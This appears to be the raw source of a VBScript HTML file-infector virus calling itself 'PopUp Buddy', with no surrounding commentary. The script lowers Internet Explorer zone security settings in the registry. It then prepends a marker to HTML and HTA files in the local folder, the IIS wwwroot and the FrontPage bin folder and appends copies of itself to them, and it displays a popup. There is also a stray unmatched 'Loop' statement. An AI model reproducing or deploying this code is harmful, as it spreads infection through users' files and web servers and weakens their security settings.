<script language=""VBScript"" id=""dasScript"">
On Error Resume Next

Const theMuch = 17

oRange = document.Scripts.NamedItem("dasScript").Text
oRanged = document.Scripts.NamedItem("popbuddy").Text
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
if location.port = "" Then
	WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
	WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"	
	thisFile = location.pathname
	theLength = Len(thisFile)
	thisFileTxt = thisFile
	Do Until thePosition = 1
		thePosition = InStr(thisFileTxt, "\")
		thePosition = thePosition + 1
		thisFileTxt = Mid(thisFileTxt, thePosition, theLength)
	Loop
	theLength2 = Len(thisFileTxt)
	theLength = theLength - theLength2
	thisFile = Mid(thisFile, 2, theLength - 1)

	theFolder(thisFile)
	theFolder("C:\Inetpub\wwwroot")
	theFolder("C:\Program Files\Microsoft FrontPage\bin")
Else
	
End If


Sub theFolder(theName)
On Error Resume Next

Set Fso = CreateObject("Scripting.FileSystemObject")
If Fso.FolderExists(theName) Then
Set FolderObj = Fso.GetFolder(theName)
    Set FO = FolderObj.Files
        For Each NewFile In FO
            ExtName = LCase(Fso.GetExtensionName(NewFile.Name))
  			Select Case ExtName
  				Case "hta", "html", "htm"
  					Set MyFile = FSO.GetFile(NewFile.path)
    				Set kamb = MyFile.OpenAsTextStream(1)
    				FileCheck = kamb.read(theMuch)
    				If FileCheck <> "<!--popupbuddy-->" Then
    					MakeFileSick(NewFile.path)
    				End if
    				kamb.close()  				
  				Case Else
  			End Select
  		Next
	Loop
Else
	Exit sub
End if
End Sub

Sub MakeFileSick(TheFileName)
On Error Resume Next

Set MyFileSick = FSO.GetFile(TheFileName)
Set kamb = MyFileSick.OpenAsTextStream(1)
FileContents = kamb.ReadAll()
kamb.Close

Set MyFileSick = FSO.GetFile(TheFileName)
Set kamb = MyFileSick.OpenAsTextStream(2)
kamb.WriteLine "<!--popupbuddy-->"
kamb.Write FileContents
kamb.WriteBlankLines(1) 
kamb.WriteLine "<script language=""VBScript"" id=""dasScript"">"
kamb.Write oRange
kamb.Write "<" & "/" & "script>"
kamb.WriteBlankLines(1)
kamb.WriteLine "<script language=""VBScript"" id=""popbuddy"">"
kamb.Write oRanged
kamb.Write "<" & "/" & "script>"
kamb.Close
End Sub
</SCRIPT>

<SCRIPT LANGUAGE="VBScript" id="popbuddy">
set oPopup = window.createPopup()
set oPopupBody = oPopup.document.body

oPopupBody.innerHTML = "PopUp Buddy was here..."
oPopup.show 300, 300, 200, 50, document.body
</SCRIPT>